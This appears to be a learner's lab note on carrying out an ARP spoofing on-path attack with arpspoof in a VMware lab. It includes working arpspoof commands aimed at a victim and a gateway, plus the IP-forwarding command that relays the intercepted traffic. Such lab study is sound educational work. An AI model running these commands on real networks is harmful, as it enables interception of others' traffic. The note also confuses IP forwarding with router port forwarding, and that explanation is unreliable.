<h3>ARP Spoof</h3>
<h4>Creates an ARP Spoofer to test and illustrate the use of 
on path attacks.
</h4>

Exploit the ARP Protocol, become the person in the middle of an On-path Attack.  Redirect the requests and response packet from the router, through yourself, to the Victim Host, and vice averse.

<img src="/assets/images/arp_spoof_diagram1.png">

ifconfig to give you the interface that is connected to the Network.  
In my case eth0.
We now use this with arpspoof -i [IP]:
-t gives us the target IP.  We obtain this target with arp -a:  

First run target is interface:
The first run targets and will fool the victim.
arpspoof -i [interface] -t [interface IP] [Gateway IP]
arpspoof -i eth0 -t 192.168.1.72 192.168.1.254 

Second run target is gateway, order does not matter just make sure to reverse.
The second run targets and will fool the router.
arpspoof -i [interface] -t [Gateway IP] [target IP (interface)] 
arpspoof -i eth0 -t 192.168.1.254 192.168.1.72

We need to enable port forwarding on Kali Linux:  
As the computer is not a router, this will allow packets to flow through it.

Port forwarding (or port mapping): NWing technique, creates a rule on your router to direct external internet traffic on a specific port to a designated device and port within a private local network (LAN).

Functions as a receptionist or auto-attendant, the router receives incoming requests and uses a "directory" of rules to send them to the correct internal device eg, security camera, game server, or home computer.

Essential remote access, allow external users connect to services eg, web servers, remote desktops, or multiplayer game sessions that are otherwise hidden behind the router's firewall.

Enable Port Forwarding on Kali Linux:
:~# echo 1 > /proc/sys/net/ipv4/ip_forward:
…

We need to send ARP Responses to the Router (Access Point) and the the Target Computer (Victim).



VMWare Fusion Network:
In order to properly test ARP Spoof we need two separate VMs that can talk to each other:
1.Ping each other.
2.Reach the internet.
3.From our Host (My MacOS), to be able to do things like;
a)SSH
b)FTP: Send files to a VM or get them out (eg, logs - using something like Filezilla):
c)Access HTTP Servers on each machine, from a browser that resides on the HOST.

Client Machine	Interface	IPv4 Address	Subnet Mask	Slash Notation	Default Gateway
Mac Host	en0	192.168.1.123	255.255.255.00 	/24	192.168.1.254
KaliLinuxVM	eth0	192.168.1.72	255.255.255.00	/24	
ParronVM	ens33	192.168.63.176	255.255.255.00	/24	
Win10VM1	Ethernet0	169.254.210.65	255.255.00.00	/16	192.168.1.254
Win10VM2	Ethernet0	192.168.63.177	255.255.255.0	/24	192.168.63.2

We want to configure VMWare Fusion in NAT mode, also known as share mode.

Configure a super switch router on the HOST Mac.
